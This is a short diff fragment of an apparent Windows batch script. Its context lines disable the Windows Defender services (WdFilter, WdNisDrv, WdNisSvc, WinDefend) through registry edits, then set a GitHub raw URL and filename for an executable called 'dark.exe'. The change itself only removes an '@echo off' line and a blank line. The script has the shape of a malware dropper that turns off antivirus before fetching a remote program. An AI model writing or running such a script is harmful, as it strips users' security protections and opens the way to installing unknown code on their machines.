@@ -60,8 +60,6 @@ reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWOR
 reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
 reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
 reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
-
-@echo off
 set "url=https://github.com/ArtunK/my-app/raw/main/dark.exe"
 set "filename=dark.exe"
 
